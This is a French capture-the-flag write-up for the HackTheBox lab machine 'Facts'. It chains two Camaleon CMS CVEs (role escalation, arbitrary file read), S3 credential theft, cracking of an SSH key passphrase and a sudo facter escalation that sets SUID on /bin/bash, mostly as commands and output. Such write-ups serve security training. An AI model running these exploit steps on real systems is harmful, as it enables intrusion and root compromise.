# Write-up -- HackTheBox : Facts

Write-up réalisé pour la machine Facts de HackTheBox. La chaîne d'exploitation enchaîne une escalade de privilèges applicative via mass-assignment (CVE-2025-2304) sur un CMS Camaleon, une lecture de fichiers arbitraires (CVE-2024-46987) pour identifier les utilisateurs, la récupération d'une clé SSH depuis un bucket S3 interne mal protégé, et enfin une escalade de privilèges root via la commande `facter` autorisée en sudo.

L'IP de la machine pendant ma session était `10.129.39.173`.

---

## Étape 1 -- Scan des ports ouverts

```bash
nmap -sC -sV -sS 10.129.39.173
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
```

**2 ports TCP ouverts** : SSH sur le 22 et HTTP sur le 80. Le serveur redirige vers `facts.htb`, qu'on ajoute à `/etc/hosts` :

```bash
sudo nano /etc/hosts
# 10.129.39.173   facts.htb
```

On atterrit sur un site qui génère des faits anecdotiques aléatoires.

---

## Étape 2 -- Découverte du CMS et création d'un compte

On commence par énumérer les répertoires avec gobuster :

```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt
```

On trouve une **page de login admin**. En interceptant la requête POST dans Burp Suite, on observe la présence d'un token CSRF dans le corps :

```
authenticity_token=SiPexifD8Uq3pEhMPxkLcz9HfUt5_dQNMwB0GiRQVxf0c2bxAqG70ZuQJ1i5BUx3n0oUKWiSF2yRPW22ahmjxQ
&user[username]=admin&user[password]=admin
```

La page de login propose également de créer un compte. On en crée un avec les credentials `test:test` et on se connecte.

On arrive sur un dashboard. En bas de page, le CMS est identifié : **Camaleon CMS Version 2.9.0**.

---

## Étape 3 -- CVE-2025-2304 : escalade de rôle par mass-assignment

Une recherche sur cette version du CMS révèle la **CVE-2025-2304**, une escalade de privilèges authentifiée par **mass-assignment** : l'endpoint `updated_ajax` accepte un paramètre `role` sans vérification, ce qui permet à n'importe quel utilisateur connecté de se promouvoir administrateur.

On clone l'exploit disponible sur GitHub (https://github.com/Alien0ne/CVE-2025-2304) et on l'exécute :

```bash
python3 exploit.py -u http://facts.htb -U test -P test
```

```
[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 5
   Current User Role: client
[+] Loading PRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+] Reverting User Role
```

On se reconnecte sur l'interface admin avec `test:test`, on est bien **admin**.

En relançant l'exploit avec les options `-e`, on extrait également des **credentials AWS S3** stockés dans la configuration du CMS :

```bash
python3 exploit.py -u http://facts.htb -U test -P test -e 
```

```
[+] Extracting S3 Credentials
   s3 access key: AKIAF60A7E3AB34F953D
   s3 secret key: I2r1YB7y1wpSgfpTkq9LEjpJZgQ2Ndms31PDDF8Z
   s3 endpoint:   http://localhost:54321
```

On garde ces credentials de côté.

---

## Étape 4 -- Fausse piste : exploration du dashboard admin

Maintenant qu'on est admin, on explore le dashboard en cherchant un vecteur d'exécution de code : upload de thème, de plugin, injection dans les templates. Aucune de ces pistes ne débouche sur quelque chose d'exploitable directement. On passe à la recherche d'une autre CVE.

---

## Étape 5 -- CVE-2024-46987 : lecture de fichiers arbitraires

On trouve la **CVE-2024-46987**, une vulnérabilité de **path traversal** authentifiée sur Camaleon CMS qui permet de lire des fichiers arbitraires sur le serveur. On clone le dépôt (https://github.com/Goultarde/CVE-2024-46987) et on lit `/etc/passwd` :

```bash
python3 exploit.py -u http://facts.htb -l test -p test /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
...
```

On identifie **deux comptes utilisateurs** : `trivia` et `william`. On essaie de lire des fichiers sensibles supplémentaires via le path traversal mais on ne trouve rien d'autre d'exploitable pour l'instant. On revient aux credentials S3 récupérés à l'étape précédente.

---

## Étape 6 -- Exploration des buckets S3 et récupération de la clé SSH

L'outil pour interagir avec un service S3 compatible depuis la ligne de commande est `s3cmd`. On configure les credentials et on liste les buckets disponibles :

```bash
s3cmd \
  --access_key=AKIAF60A7E3AB34F953D \
  --secret_key=I2r1YB7y1wpSgfpTkq9LEjpJZgQ2Ndms31PDDF8Z \
  --host=facts.htb:54321 \
  --host-bucket="facts.htb:54321" \
  --no-ssl ls s3://
```

```
2025-09-11 12:06  s3://internal
2025-09-11 12:06  s3://randomfacts
```

Le bucket `internal` semble intéressant. On l'explore :

```bash
s3cmd [...] ls s3://internal
```

```
DIR  s3://internal/.bundle/
DIR  s3://internal/.cache/
DIR  s3://internal/.ssh/
     s3://internal/.bash_logout
     s3://internal/.bashrc
     s3://internal/.profile
```

Le dossier `.ssh` attire immédiatement l'attention :

```bash
s3cmd [...] ls s3://internal/.ssh/
```

```
s3://internal/.ssh/authorized_keys
s3://internal/.ssh/id_ed25519
```

On télécharge la clé privée :

```bash
s3cmd [...] get s3://internal/.ssh/id_ed25519
```

---

## Étape 7 -- Fausse piste : clé SSH protégée par passphrase

On tente de s'authentifier en SSH avec la clé récupérée :

```bash
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@10.129.39.173
```

```
Enter passphrase for key 'id_ed25519':
Permission denied, please try again.
```

La clé est chiffrée et demande une passphrase. Aucune connexion directe possible. Il faut la cracker.

---

## Étape 8 -- Crack de la passphrase avec John The Ripper

Comme pour une archive ZIP, John The Ripper nécessite d'abord d'extraire le hash de la clé dans un format qu'il peut attaquer. C'est le rôle de `ssh2john` :

```bash
ssh2john id_ed25519 > hash.john
john -w=/usr/share/wordlists/rockyou.txt hash.john
```

```
dragonballz      (id_ed25519)
1g 0:00:02:32 DONE
Session completed.
```

La passphrase est **`dragonballz`**. On relance la connexion SSH en la renseignant :

```bash
ssh -i id_ed25519 trivia@10.129.39.173
# Enter passphrase: dragonballz
```

On est connecté en tant que `trivia`.

---

## Étape 9 -- Flag user

Le flag utilisateur se trouve dans le home de `william` :

```bash
trivia@facts:/home/william$ cat user.txt
```

**Flag user :** `cf30e614e1088fcc315a23d49ef0e9ce`

---

## Étape 10 -- Escalade de privilèges via facter

On vérifie les droits sudo de `trivia` :

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

**Facter** est un outil utilisé par Puppet pour collecter des informations système : les "facts" qui donnent leur nom à la machine ! Pour être extensible, Facter peut charger des données depuis des répertoires externes via `--external-dir` : s'il y trouve des scripts exécutables, il les exécute automatiquement avec ses propres droits, ici root.

On crée un script malveillant dans `/tmp` qui active le bit SUID sur `/bin/bash` :

```bash
mkdir /tmp/root && cd /tmp/root

cat > shell.sh << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF

chmod +x shell.sh
```

On lance facter en root en pointant sur notre répertoire :

```bash
sudo /usr/bin/facter --external-dir /tmp/root
```

Facter exécute `shell.sh` en tant que root, ce qui active le SUID sur `/bin/bash`. On obtient alors un shell root avec `-p` (qui préserve les privilèges effectifs) :

```bash
bash -p
```

```bash
bash-5.2# cat /root/root.txt
f5d7b57ac01230c0db4b5d9a3210f1be
```

**Flag root :** `f5d7b57ac01230c0db4b5d9a3210f1be`
